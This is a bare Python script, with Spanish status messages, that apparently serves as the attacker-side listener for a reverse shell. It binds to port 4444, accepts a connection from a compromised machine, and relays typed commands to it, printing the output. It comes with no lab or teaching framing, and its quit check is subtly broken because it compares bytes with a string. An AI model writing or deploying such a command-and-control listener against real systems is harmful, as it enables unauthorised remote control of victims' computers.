import socket

ip = "192.168.0.207"
port = 4444


listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((ip, port))
listener.listen(10)


def aceptar():
    print("[+] Esperando por conexiones")
    conn, addr = listener.accept()
    print("[+] Tenemos una conexion de " + str(addr))
    comandos(conn)
    conn.close()

def comandos(conn):
    while True:
        cmd = input(">>")

        if str.encode(cmd) == "q":break

        if len(str.encode(cmd)) > 0:

            conn.send(str.encode(cmd))
            respuesta = str(conn.recv(1024))
            print(respuesta)

aceptar()
